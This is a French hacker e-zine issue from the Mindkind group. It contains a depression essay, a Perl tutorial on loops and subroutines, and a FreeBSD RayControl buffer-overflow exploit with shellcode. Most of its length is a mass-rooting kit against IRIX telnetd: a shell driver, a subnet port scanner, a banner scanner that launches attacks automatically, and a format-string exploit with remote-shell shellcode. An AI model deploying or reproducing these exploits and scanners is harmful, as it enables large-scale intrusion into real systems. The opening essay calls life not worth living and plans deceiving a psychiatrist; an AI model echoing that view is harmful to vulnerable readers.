faire un autre rendez-vous  dans 1 mois avec   la  secrΘtaire  en sortant,   et
ma   souhaitΘ   bonne  chance.   J'ai   eu envi   de  lui demander  si  j'Θtais
simplement venu ici pour un 30   minutes en sa compagnie, me faisant  poser des
questions  que  je  me   suis  dΘjα posΘs moi-mΩme,  mais je me suis  tait,  et
j'ai quittΘ la piΦce, en le remerciant.

J'ai donc eu la rΘponse a ma question,  oui, je suis dΘprimΘ. Et j'ai fini  par
me dire  que  la  dΘprime  est   l'Θtat  mΩme  de  la rencontre avec  l'idΘe du
non-Ωtre. Depuis ce jour, je tente de  me dire que τa va  passer,  que  se tuer
n'est pas la solution,  car il est toujours  trop tard,  et que  peu importe la
faτon  dont je  vie, je  vais finir  au mΩme  endroit  que   le  dΘprimΘ,   que
l'heureux. AprΦs tout, tout  le  monde  le  sait   bien, la vie ne  vaut pas la
peine d'Ωtre vΘcue.  Ma  conclusion se rapproche au malheur d'avoir d'avoir une
conscience, et de lα,  on  ne  peut  pas rΘellement y changer quoi que ce soit.
Demain j'irai revoir le psy.  J'ai dΘjα prΘparΘ  mes rΘponses, en prΘparant mon
subconscient  aux mensonges  qui pourraient  sortir de  ma bouche:  oui, τa  va
mieux. AprΦs tout, je ne l'aime pas, rien m'empΩche de  lui jouer un jeux,   et
tout compte faite, τa l'avantage lui aussi; son estime personnelle  va  monter.
Oui, demain j'irai le  voir, il me reste   qu'α espΘrer que  τa  ne prendra pas
trop  longtemps,  de cette  faτon,  je  pourrai revenir ici, dΘprimer en  paix,
et ha∩r ma  putain  de conscience.


                                                           c4ndu.
     


            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                 c4ndu@mindkind.org                      /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'






   < Mindkind tales from IRC >
   < Directly from rebels division >

   [21:31] &lt;LastCall_> la dailleurs jcontinue mon tuto
   [21:32] &lt;nothing94> "comment hacker Pathfinder avec Perl et un signal laser" je suppose ?
   [21:33] &lt;LastCall_> HAHAHAHAHA
   [21:34] &lt;nothing94> jpensais pas ctait si drole que τa

  < ----------------------- >




                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.13   └ la conquΩte du chameau; Part 3               \        \     !
     .             aka                                         \        \    .
     ;          J'aurais mieux aimΘ camel dise pas              \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     


Les derniΦres parties de ce tutorial Θtaient plut⌠t fastoches, on a vu  comment
jouer avec les variables, et comment faire des expressions avec des opΘrateurs.
Il serait peut-Ωtre temps  qu'on voie  des choses  pour enfin programmer! Voici
donc les structures de contr⌠les et boucles.


L'art de faire 72000 affaires avec if
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
Bon c'est une  blague, il n'y  a pas vraiment  72000 affaires α  faire avec if,
mais par  contre Perl  offre l'inverse  du if,  le moyen  d'inverser if  et une
maniΦre bizarre de dire else if. Voici donc de quoi tout τa a l'air :
if ($CONDITION) { affaires(); }
Dans le cas la les { } sont OBLIGATOIRE. Que vous faite τa sur une ligne ou
if ($CONDITION) {
	affaires();
}
de  mΩme, vous  avez α  mettre les  {} tout  le temps.  Si vous  vous  demander
pourquoi, ou  bien comment  se dΘbarrasser  de τa,  c'est que  le if agit d'une
maniΦre peu commune :
affaires() if ($CONDITION);
Cette  ligne est  totalement valide.  ╔videmment on  exΘcute affaires()  si la
condition est vrai... Admettons que  vous voulez faire le contraire  de if(si),
disons un if(!$CONDITION), et bien vous pouvez utiliser unless(sauf si) :
unless ($CONDITION) {
	affaires();
}
Le else existe, et le else if  est nommΘ bizarrement elsif. Il est α  noter que
unless n'a pas de "elsunless". Voici un exemple clair :
if ($CONDITION) {
	affaires();
} elsif ($CONDITION2) {
	affaires2();
} else {
	affaires3();
}
Finalement, l'opΘrateur conditionnel "? :" (comme en C) existe aussi en Perl :
$CONDITION ? affaires() : affaireselse();


Boucles Boucles Boucles Boucles Boucles
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
Loops en anglais (moins laid que boucles j'avoue).
On retrouve en Perl les loops que nous sommes habituΘs de voir :
while($COND) { affaires(); }
until($COND) { affaires(); }
for(my $i = 0; $i <=10; $i++) { affaires(); }
Cependant on retrouve aussi des affaires ΘsotΘriques tel que le "continue" :
while($COND) { affaires(); } continue { print "hop! "; }
└ chaque itΘration du while le bloque aprΦs continue sera exΘcutΘ, un peu  dans
le genre du $i++ dans le for. Aussi, il y a des "shortcuts" qu'on peut prendre.
Admettons qu'on veut  passer α la  prochaine itΘration de  la boucle sans  tout
exΘcuter dans les affaires(), et bien on met un next; qui s'occupera de quitter
le code en cours et d'aller α la suite de la boucle. Il existe aussi last;  qui
permet de quitter  la boucle. Et  comme si c'Θtait  pas assΘ, il  y a redo; qui
refait le block d'affaires α exΘcuter. Palpitant.
En  plus de  ces boucles,  on retrouve  le fameux  foreach. foreach  permet de
parcourir une liste et d'exΘcutΘ le bloc α chaque item de la liste :
foreach $jour (@semaine) { print $jour; }
va imprimer chaque jour dans semaine(exemple poche j'avoue). Pour rajouter plus
de libertΘ dans  votre vie de  programmeur, foreach est  pareil que for  (huh),
c'est α dire que  si vous Θcrivez for  $jour (@semaine) et bien  τa va marcher.
Personnellement je prΘfΦre Θcrire foreach car τa se "lit mieux". N'oublier  pas
que le @semaine est traitΘ en valeur de liste, donc on peut utiliser  n'importe
quel fonction  qui retourne  une liste  (comme keys  pour savoir  les clef d'un
hash, de cette maniΦre  : keys %monhash) ou  bien encore Θcrire directement  la
liste nous mΩme :
foreach $machin ("pwet", "meuh", "ayoye")
τa va marcher. on peut aussi mettre 1..10 pour compter de 1 α 10..
De plus, si vous mettez pas $machin, τa va marcher pareil! Respectivement,
"pwet", "meuh" et "ayoye" vont se retrouver dans $_. Humm bizare ce $_...


Les variables bizares
»»»»»»»»»»»»»»»»»»»»»»
Perl contient une  panoplie de variables  dites "bizares" ou  "spΘciales". Elle
sont spΘciales car elles contiennent toute sorte d'affaire magiquement affectΘ.
Par exemple le $_ contient la "chose" en cours :
foreach (1,2,3) { print $_; }
Va imprimer les 1 2 3 vu que le $machin devant la liste a ΘtΘ ommit.
On peut aussi faire:
foreach (1,2,3) { print; }
car print  imprime $_  lorsqu'on lui  passe aucun  argument ;-)  $_ ne sert pas
juste pour  foreach, il  sert aussi  au pattern  matching, et  lorsqu'on lit un
fichier. Il est aussi appelΘ $ARG lorsque l'ont met "use English;" au dΘbut  de
notre script. D'ailleurs  pour chaque variable  spΘciale, il existe  sa version
anglaise, qui est bien  s√r plus longue α  Θcrire, mais plus facile  α retenir.
Bien qu'il existe plusieurs variables  spΘciales, je me sers presque  seulement
de ceux-ci, les autres Θtant trop prΘcis ou trop compliquer α retenir :
$!
  Contient la derniΦre erreur
     open FICHIER, "fichier" or die "ne peut ouvrir fichier : $!";
@ARGV
  liste qui contient les arguments passΘs au script par la command line
%ENV
  hash qui contient l'environnement Unix 
     exemple : $ENV{PATH}
$]
  contient la version courante de Perl
     $PERL_VERSION avec use English;
$0
  contient le nom du fichier du script Perl en cours
$^O
  contient le nom du OS pour lequel le binary de Perl a ΘtΘ compilΘ
@_
  liste qui contient les paramΦtres d'une sub..
  
(remarquer encore ici le lien logique entre mon dernier mot de cette section et
la prochaine section, hehe)


Les sous-routines (sub)
»»»»»»»»»»»»»»»»»»»»»»»
Un jour va arriver que vos scripts Perl vont commencer α Ωtre un peu plus  gros
que 2  lignes. Cette  journΘe la  vous allez  s√rement aussi  commencer α  vous
servir des subs :
sub zouit { affaires(); }
Cette ligne dΘclare la sub zouit  qui va exΘcuter les affaires(). Pour  une sub
avec des paramΦtres, on la call de la maniΦre suivante :
zouit $param1, $param2;
Dans la dΘclaration de la sub, il n'y a aucune spΘcification de paramΦtres.  La
raison est que chaque paramΦtre est empilΘ dans la pile nommΘe @_, on y  accΦde
donc de la maniΦre suivante:
sub zouit {
	my $bah = shift @_;
	my $beh = shift @_;
}
On peut  aussi omettre  le @_  et juste  Θcrire shift,  qui va  le shifter  par
dΘfaut. Si on est s√r qu'on va toujours avoir 2 paramΦtres, on peut aussi faire
sub zouit {
	my ($bah, $beh) = @_;
}
Rappel : Les parenthΦses dans ce cas-ci  serve α donner un contexte de liste  α
$bah et $beh dans le  but de lui associer une  autre liste (le array @_);  Pour
retourner de la sub, on utilise return; (ouf compliquΘ τa la). Aussi noter  que
dans @_ on mets n'importe quel  variable qu'on veut, autant des hash,  d'autres
listes, des rΘfΘrences.


Jouer aux blocs lΘgos c'est funne
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Depuis tant⌠t qu'on voit des  {} partout. Ordinairement en programmation  on ne
se pose pas trop de questions, τa fait parti de la syntaxe de chaque statement.
Par contre en Perl un {} est appelΘ un bloc et peut Ωtre utilisΘ seul.
{
	affaires();
}
Bon ok peu pratique, mais on peut faire comme avec les boucles, mettre un  next
dedans et τa va sortir du block.. (mΩme chose avec last, pis on peut mΩme faire
un redo. heh)
{
	next if ($COND);
	affaires();
}
Disons que c'est une faτon bizarre de faire un if..


Les bons vieux GOTOs
»»»»»»»»»»»»»»»»»»»»
Depuis tant⌠t que je parle de boucles, de next, de last et etc.. Les plus futΘs
d'entre-vous on s√rement aperτu un genre de  goto dans τa. Et bien oui, Perl  a
des GOTOs. On peut mΩme le faire nous autre mΩme. Mettons que j'ai un while, et
bien  je peux  mettre devant  un label  pour spΘcifier  le nom  du while..  pas
pratique quand il y a juste un while, mais trΦs quand ta 2 boucles imbriquΘes :
MEUH: for (1..2) {
	for (1..5) {
		print $_;
		next MEUH if ($_ == 2);
	}
}
Plut⌠t useless, mais τa dΘmontre bien comment s'en servir. Faites attention ici
de ne pas mettre "gogo" lui mΩme α la place de next, bien que τa fasse la  mΩme
chose, le next termine la 2iΦme boucle  for, alors que le goto garde tout  α la
mΩme place (ce qui  rΘsulte en une boucle  infinie). On peut donc  utiliser les
gotos comme on veut, mais il faut faire attention.. Je pourrais Θcrire :
goto MEUH;
ici et τa va retourner α ma boucle de tant⌠t.. comme dans le bon vieux temps de
la programmation en BASIC, heh.


Conclusion
»»»»»»»»»»
Et voilα, maintenant avec l'accumulation  de mes autres articles,  vous  pouvez
coder des scripts qui ont de l'allure et  comprendre ceux qui sont  dΘjα Θcrit.
Les  prochains articles  s'annoncent plus  pratiques que  thΘoriques, car  cotΘ
thΘorie de base j'ai dΘjα fait le tour pas mal, c'est juste que Perl est  conτu
α 99% de  "tip & tricks",  donc il risque  un jour que  d'avoir des articles de
"tips" et de "tricks".. d'ici lα, on  va avoir  passΘ par les modules les  plus
populaires en Perl, et la  programmation orientΘe objet en Perl.  (╟a parais-tu
je me suis fait un plan pour les futurs articles? haha!)

Dans la prochaine partie de ce  tutorial nous allons  voir le pattern  matching
en Perl  et comment utiliser des modules. Si vous avez des questions  n'hΘsitez
pas α me  les poser, si pertinentes, elles seront rΘpondues et inclues dans les
futurs articles.

                                                                    - LastCall_



            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                lastcall@mindkind.org                    /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'




------------------------------- 8< cut here 8< -------------------------------


#!/usr/bin/perl
#
# Fbsd RayControl exploit, dosen't give root since it's not seuid.
#
###########################################################
my $shout = "MindKind";
my $coder = "FunkY"; 
###########################################################

my $execv = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f" .
            "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53" .
            "\xb0\x3b\x50\xcd\x80";

my $ret   = "\x90\xf8\xbf\xbf";
my $nop   = "\x90";
my $head  = 36;
my $body  = 100;
my $buf;
                              
#                   .:[Building buffer]:.
 
 $buf .= "A"x$head;
 $buf .= $ret;
 $buf .= $nop x($body-length($execv));
 $buf .= $execv;

#                 .:[Exploitation Starts]:. 
 
 system("/usr/sbin/raycontrol", "-i" , "$buf");

------------------------------- 8< cut here 8< -------------------------------




                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.14 Mass telned against irix                         \        \     !
     .             aka                                         \        \    .
     ;       T'en veux-tu du code en vla!                       \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
            
            
                                      
# wassup MinDkinD 
# j'aimerais vous prΘsenter un petit projet que j'ai faite
# parce qu en rΘalitΘ *JMEMMERDE* , en tk tout dans le
# but de vous faire part de la vulnΘrabilitΘ des systΦmes IRIX
# vis versa le deamon telnetd , Hey , oui ! encore un massrooter
# dΘsolΘ je manque d'imagination anyways , vla l'code :

-------------- [ mass-irix.sh ] ------------------------------

#!bin/sh

author () {

echo " ################## "
echo " # -=[mindkind]=- # "
echo " #  koded by vaL  # "
echo " ################## "
echo " #  mass telnetd  # "
echo " #  against irix  # "
echo " ################## " 

         } 
author
sleep 3
main () {  echo " perfect , which subnet u wanna target ex : 134.25 "
           read subnet
           echo " -> n0ted. of course we attacking port[23] "
           port="23"
           echo " holdon buddy ,loading scan properties   "
           echo " ***Launching scan against $subnet $port "
           nohup ./pscan $subnet $port &
        }
sleep 3
main
echo " -> perfect scan is running "
sub () { tail -f ips.log | while read VICTIM
         do
           echo " *** verifiing $1 *** "
           ./irixscan $1 
         done
 
       }
echo " ***Launching attack*** in 5 sec  "
sleep 5
sub
exit 0
-------------------------------------------------------------------------------------

# lame bin/sh skript0r to run tha massrooter

-------------- [ pscan.c ] -----------------------------------------------------------
/*
** pscan.c - Originally by Volatile
** modified by _dave
** and finally re-written by vaL0r
** -=[ mindkind team ]=-
*/

#include &lt;arpa/inet.h>
#include &lt;stdio.h>
#include &lt;string.h>
#include &lt;time.h>
#include &lt;fcntl.h>
#include &lt;stdlib.h>
#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;netinet/in.h>
#include &lt;errno.h>
#include &lt;unistd.h>

#define MAX_SOCKETS 1000
#define TIMEOUT 2

#define S_NONE       0
#define S_CONNECTING 1

struct conn_t {
    int s;
    char status;
    time_t a;
    struct sockaddr_in addr;
};
struct conn_t connlist[MAX_SOCKETS];

void init_sockets(void);
void check_sockets(void);
void fatal(char *);

FILE *outfd;
int tot = 0;

int main(int argc, char *argv[])
{
    int done = 0, i, cip = 1, bb = 0, ret, k, ns, x;
    time_t scantime;
    char ip[20], outfile[128], last[256];

    if (argc < 3)
    {
        printf("Usage: %s &lt;b-block> &lt;port> [c-block]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    memset(&outfile, 0, sizeof(outfile));
    if (argc == 3)
        snprintf(outfile, sizeof(outfile) - 1, "ips.log", argv[1], argv[2]);
    else if (argc >= 4)
    {
        snprintf(outfile, sizeof(outfile) - 1, "ips.log", argv[1], argv[3], argv[2]);
        bb = atoi(argv[3]);
        if ((bb < 0) || (bb > 255))
            fatal("Invalid b-range.\n");
    }

    if (!(outfd = fopen(outfile, "a")))
    {
        perror(outfile);
        exit(EXIT_FAILURE);
    }
    printf("[ sockets -> %d ] [ timeout -> %ds ][ output -> %s ]\n"
           "Currently scanning: ", MAX_SOCKETS, TIMEOUT, outfile, argv[1]);
    fflush(stdout);

    memset(&last, 0, sizeof(last));
    init_sockets();
    scantime = time(0);

    while(!done)
    {
        for (i = 0; i < MAX_SOCKETS; i++)
        {
            if (cip == 255)
            {           
                if ((bb == 255) || (argc >= 4))
                {
                    ns = 0;
                    for (k = 0; k < MAX_SOCKETS; k++)
                    {
                        if (connlist[k].status > S_NONE)
                        {
                            ns++;
                            break;
                        }
                    }

                    if (ns == 0)
                        done = 1;

                     break;
                }
                else
                {
                    cip = 0;
                    bb++;
                    for (x = 0; x < strlen(last); x++)
                        putchar('\b');
                    memset(&last, 0, sizeof(last));
                    snprintf(last, sizeof(last) - 1, "%s.%d.* (total: %d) (%.1f%% done)",
                        argv[1], bb, tot, (bb / 255.0) * 100);
                    printf("%s", last);
                    fflush(stdout);
                }
            }

            if (connlist[i].status == S_NONE)
            {
                connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
                if (connlist[i].s == -1)
                    printf("Unable to allocate socket.\n");
                else
                {
                    ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
                    if (ret == -1)
                    {
                        printf("Unable to set O_NONBLOCK\n");
                        close(connlist[i].s);
                    }
                    else
                    {
                        memset(&ip, 0, 20);
                        sprintf(ip, "%s.%d.%d", argv[1], bb, cip);
                        connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
                        if (connlist[i].addr.sin_addr.s_addr == -1)
                            fatal("Invalid IP.");
                        connlist[i].addr.sin_family = AF_INET;
                        connlist[i].addr.sin_port = htons(atoi(argv[2]));
                        connlist[i].a = time(0);
                        connlist[i].status = S_CONNECTING;
                        cip++;
                    }
                }
            }
        }
        check_sockets();
    }

    printf("\nPscan completed in %u seconds. (found %d ips)\n", (time(0) - scantime), tot);
    fclose(outfd);
    exit(EXIT_SUCCESS);
}

void init_sockets(void)
{
    int i;

    for (i = 0; i < MAX_SOCKETS; i++)
    {
        connlist[i].status = S_NONE;
        memset((struct sockaddr_in *)&connlist[i].addr, 0, sizeof(struct sockaddr_in));
    }
    return;
}

void check_sockets(void)
{
    int i, ret;

    for (i = 0; i < MAX_SOCKETS; i++)
    {
        if ((connlist[i].a < (time(0) - TIMEOUT)) && (connlist[i].status == S_CONNECTING))
        {
            close(connlist[i].s);
            connlist[i].status = S_NONE;
        }
        else if (connlist[i].status == S_CONNECTING)
        {
            ret = connect(connlist[i].s, (struct sockaddr *)&connlist[i].addr,
                sizeof(struct sockaddr_in));
            if (ret == -1)
            {
                if (errno == EISCONN)
                {
                    tot++;
                    fprintf(outfd, "%s\n",
                        (char *)inet_ntoa(connlist[i].addr.sin_addr));
                    close(connlist[i].s);
                    connlist[i].status = S_NONE;
                }

                if ((errno != EALREADY) && (errno != EINPROGRESS))
                {
                    close(connlist[i].s);
                    connlist[i].status = S_NONE;
                }
            }
            else
            {
                tot++;
                fprintf(outfd, "%s\n",
                    (char *)inet_ntoa(connlist[i].addr.sin_addr));
                close(connlist[i].s);
                connlist[i].status = S_NONE;
            }
        }
    }
}

void fatal(char *err)
{
    int i;
    printf("Error: %s\n", err);
    for (i = 0; i < MAX_SOCKETS; i++)
        if (connlist[i].status >= S_CONNECTING)
            close(connlist[i].s);
    fclose(outfd);
    exit(EXIT_FAILURE);
}
----------------------------------------------------------------------------------------

#main scanning routine who output data to >>  ips.log

-------------- [ irixscan.c ] ----------------------------------------------------------
/* 
   irixscan.c by vaL0r for Team MindKinD Research

   booya , here is my new telnetd scanner and stupid utilities to
   grab and exploit irix telnetd exploitable hosts.

   use with pscan for better result
  
   compile : gcc -o irixscan irixscan.c
   syntax : ./pscan $subnet 23 ; tail -f ips.log | while read subnet ; do ; ./irix-scan $subnet

   enough talking , enjoy the violence errrr i mean the silence
 */

#include &lt;arpa/inet.h>
#include &lt;errno.h>
#include &lt;fcntl.h>
#include &lt;netdb.h>
#include &lt;netinet/in.h>
#include &lt;signal.h>
#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;string.h>
#include &lt;sys/socket.h>
#include &lt;sys/stat.h>
#include &lt;sys/types.h>
#include &lt;sys/wait.h>
#include &lt;time.h>
#include &lt;unistd.h>

int main(int argc, char *argv[])
{

  struct sockaddr_in sin;
  int sock, len;
  u_char buf[4000];
  FILE *ihatetempfiles;
  char telnet[150];  

  printf("Team SigDie Research\n");
  printf("IRIX telnetd exploit scanner\n");
  printf("Written by vaL0r\n");
  printf("\n");
  if (argc < 2) 
  {
    printf("Usage: %s &lt;ip_address>\n", argv[0]);
    exit(0);
  }
  printf("[***] Connecting to %s port 23...\n", argv[1]);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (!sock)
  {
     fprintf(stderr, "[***] Unable to get a socket\n");
     return;
  }
  sin.sin_family = AF_INET;
  sin.sin_port = htons(23);
  sin.sin_addr.s_addr = inet_addr(argv[1]);
  alarm(4);
  if (connect(sock, (struct sockaddr*)&sin, sizeof(sin)) == 0) 
  {
     while (1)
     {
       memset(buf, 0, sizeof(buf));
       if ((len = read (sock, buf, 1)) <= 0)
         break;
       if (*buf == (unsigned int) 255)
       {
         read(sock, (buf + 1), 2);
         if (*(buf + 1) == (unsigned int) 253 && !(u_char) * (buf + 2));
         else if ((u_char) * (buf + 1) == (unsigned int) 253)
         {
           *(buf + 1) = 252;
           write (sock, buf, 3);
         }
       }
       else
       {
  	 if (*buf != 0)
         {
           bzero (buf, sizeof (buf));
           read (sock, buf, sizeof (buf));
           usleep(40000);
           #ifdef VERBOSE
           printf("%s",buf);
	   #endif
	 }
         if (strstr(buf, "irix 6.2"))
         {
           alarm(65000);
	   printf("[***] IRIX telnetd found on %s host.  Attempting to exploit...\n");
           sprintf(telnet,"irix  %s -v 62 ",argv[1]);
	   system(telnet);	
           alarm(0);
           return 1;
         }
         if (strstr(buf, "irix 6.3"))
         {
           alarm(65000);
	   printf("[***] IRIX telnetd found on %s host.  Attempting to exploit...\n");
           sprintf(telnet,"irix  %s -v 63 ",argv[1]);
	   system(telnet);	
           alarm(0);
           return 1;
         }
         if (strstr(buf, "irix 6.4"))
         {
           alarm(65000);
	   printf("[***] IRIX telnetd found on %s host.  Attempting to exploit...\n");
           sprintf(telnet,"irix  %s -v 64 ",argv[1]);
	   system(telnet);	
           alarm(0);
           return 1;
         }
         if (strstr(buf, "irix 6.5"))
         {
           alarm(65000);
	   printf("[***] IRIX telnetd found on %s host.  Attempting to exploit...\n");
           sprintf(telnet,"irix  %s -v 65 ",argv[1]);
	   system(telnet);	
           alarm(0);
           return 1;
         }
       }
     }
  }
}

----------------------------------------------------------------------------------

#mostly grab the banner from ips.log and attempt to exploite appropriate verzion

--------------------- [telnetd-IRIX.c ]----------------------------------------------

                                                                    */
/* code was slightly modified in order to properly compile with gcc and to    */
/* work from within little endian machines                                    */
/* slightly revised by vaL0r , i wont take credit , this code was realised    */
/* by the lsd-pl.net, stout to them !

#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;sys/types.h>
#include &lt;sys/time.h>
#include &lt;netinet/in.h>
#include &lt;netdb.h>
#include &lt;unistd.h>
#include &lt;stdio.h>
#include &lt;errno.h>

char shellcode[]=
    "\x04\x10\xff\xff"             /* bltzal  $zero,&lt;shellcode>    */
    "\x24\x02\x03\xf3"             /* li      $v0,1011             */
    "\x23\xff\x02\x14"             /* addi    $ra,$ra,532          */
    "\x23\xe4\xfe\x08"             /* addi    $a0,$ra,-504         */
    "\x23\xe5\xfe\x10"             /* addi    $a1,$ra,-496         */
    "\xaf\xe4\xfe\x10"             /* sw      $a0,-496($ra)        */
    "\xaf\xe0\xfe\x14"             /* sw      $zero,-492($ra)      */
    "\xa3\xe0\xfe\x0f"             /* sb      $zero,-497($ra)      */
    "\x03\xff\xff\xcc"             /* syscall                      */
    "/bin/sh"
;

typedef struct{char *vers;}tabent1_t;
typedef struct{int flg,len;int got,g_ofs,subbuffer,s_ofs;}tabent2_t;

tabent1_t tab1[]={
    { "IRIX 6.2  libc.so.1: no patches      telnetd: no patches          " },
    { "IRIX 6.2  libc.so.1: 1918|2086       telnetd: no patches          " },
    { "IRIX 6.2  libc.so.1: 3490|3723|3771  telnetd: no patches          " },
    { "IRIX 6.2  libc.so.1: no patches      telnetd: 1485|2070|3117|3414 " },
    { "IRIX 6.2  libc.so.1: 1918|2086       telnetd: 1485|2070|3117|3414 " },
    { "IRIX 6.2  libc.so.1: 3490|3723|3771  telnetd: 1485|2070|3117|3414 " },
    { "IRIX 6.3  libc.so.1: no patches      telnetd: no patches          " },
    { "IRIX 6.3  libc.so.1: 2087            telnetd: no patches          " },
    { "IRIX 6.3  libc.so.1: 3535|3737|3770  telnetd: no patches          " },
    { "IRIX 6.4  libc.so.1: no patches      telnetd: no patches          " },
    { "IRIX 6.4  libc.so.1: 3491|3769|3738  telnetd: no patches          " },
    { "IRIX 6.5-6.5.8m 6.5-6.5.7f           telnetd: no patches          " },
    { "IRIX 6.5.8f                          telnetd: no patches          " }
};

tabent2_t tab2[]={
    { 0, 0x56, 0x0fb44390, 115, 0x7fc4d1e0, 0x14 },
    { 0, 0x56, 0x0fb483b0, 117, 0x7fc4d1e0, 0x14 },
    { 0, 0x56, 0x0fb50490, 122, 0x7fc4d1e0, 0x14 },
    { 0, 0x56, 0x0fb44390, 115, 0x7fc4d220, 0x14 },
    { 0, 0x56, 0x0fb483b0, 117, 0x7fc4d220, 0x14 },
    { 0, 0x56, 0x0fb50490, 122, 0x7fc4d220, 0x14 },
    { 0, 0x56, 0x0fb4fce0, 104, 0x7fc4d230, 0x14 },
    { 0, 0x56, 0x0fb4f690, 104, 0x7fc4d230, 0x14 },
    { 0, 0x56, 0x0fb52900, 104, 0x7fc4d230, 0x14 },
    { 1, 0x5e, 0x0fb576d8,  88, 0x7fc4cf70, 0x1c },
    { 1, 0x5e, 0x0fb4d6dc, 102, 0x7fc4cf70, 0x1c },
    { 1, 0x5e, 0x7fc496e8,  77, 0x7fc4cf98, 0x1c },
    { 1, 0x5e, 0x7fc496e0,  77, 0x7fc4cf98, 0x1c }
};

char env_value[1024];

int prepare_env(int vers){
    int i,adr,pch,adrh,adrl;
    char *b;

    pch=tab2[vers].got+(tab2[vers].g_ofs*4);
    adr=tab2[vers].subbuffer+tab2[vers].s_ofs;
    adrh=(adr>>16)-tab2[vers].len;
    adrl=0x10000-(adrh&0xffff)+(adr&0xffff)-tab2[vers].len;

    b=env_value;
    if(!tab2[vers].flg){
        for(i=0;i<1;i++) *b++=' ';
        for(i=0;i<4;i++) *b++=(char)((pch>>((3-i%4)*8))&0xff);
        for(i=0;i<4;i++) *b++=(char)((pch+2>>((3-i%4)*8))&0xff);
        for(i=0;i<3;i++) *b++=' ';
        for(i=0;i&lt;strlen(shellcode);i++){
            *b++=shellcode[i];
            if((*(b-1)==(char)0x02)||(*(b-1)==(char)0xff)) *b++=shellcode[i];
        }
        sprintf(b,"%%%05dc%%22$hn%%%05dc%%23$hn",adrh,adrl);
    }else{
        for(i=0;i<5;i++) *b++=' ';
        for(i=0;i<4;i++) *b++=(char)((pch>>((3-i%4)*8))&0xff);
        for(i=0;i<4;i++) *b++=' ';
        for(i=0;i<4;i++) *b++=(char)((pch+2>>((3-i%4)*8))&0xff);
        for(i=0;i<3;i++) *b++=' ';
        for(i=0;i&lt;strlen(shellcode);i++){
            *b++=shellcode[i];
            if((*(b-1)==(char)0x02)||(*(b-1)==(char)0xff)) *b++=shellcode[i];
        }
        sprintf(b,"%%%05dc%%11$hn%%%05dc%%12$hn",adrh,adrl);
    }
    b+=strlen(b);
    return(b-env_value);
}

main(int argc,char **argv){
    char buffer[8192];
    int i,c,sck,il,ih,cnt,vers=65;
    struct hostent *hp;
    struct sockaddr_in adr;

    printf("copyright LAST STAGE OF DELIRIUM   //lsd-pl.net/\n");
    printf("telnetd for irix 6.2 6.3 6.4 6.5 6.5.8 IP:all\n\n");

    if(argc<2){
        printf("usage: %s address [-v 62|63|64|65]\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"sc:p:v:"))!=-1){
        switch(c){
        case 'v': vers=atoi(optarg);
        }
    }   

    switch(vers){
    case 62: il=0;ih=5; break;
    case 63: il=6;ih=8; break;
    case 64: il=9;ih=10; break;
    case 65: il=11;ih=12; break;
    default: exit(-1);
    }

    for(i=il;i<=ih;i++){
        printf(".");fflush(stdout);
        sck=socket(AF_INET,SOCK_STREAM,0);
        adr.sin_family=AF_INET;
        adr.sin_port=htons(23);
        if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if((hp=gethostbyname(argv[1]))==NULL){
                errno=EADDRNOTAVAIL;perror("error");exit(-1);
            }
            memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
        }
 
        if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))<0){
            perror("error");exit(-1);
        }

        cnt=prepare_env(i);
        memcpy(buffer,"\xff\xfa\x24\x00\x01\x58\x58\x58\x58\x00",10);
        sprintf(&buffer[10],"%s\xff\xf0",env_value);
        write(sck,buffer,10+cnt+2);
        sleep(1);
        memcpy(buffer,"\xff\xfa\x24\x00\x01\x5f\x52\x4c\x44\x00%s\xff\xf0",10);
        sprintf(&buffer[10],"%s\xff\xf0",env_value);
        write(sck,buffer,10+cnt+2);

        if(((cnt=read(sck,buffer,sizeof(buffer)))<2)||(buffer[0]!=(char)0xff)){
            printf("warning: telnetd seems to be used with tcp wrapper\n");
        }
#define COMMAND "  **** be creative there .. **** "
        write(sck,"/bin/uname -a ; COMMAND",14);
        if((cnt=read(sck,buffer,sizeof(buffer)))>0){
            printf("\n%s\n\n",tab1[i].vers);
            write(1,buffer,cnt);
            break;
        }
        close(sck);
    }
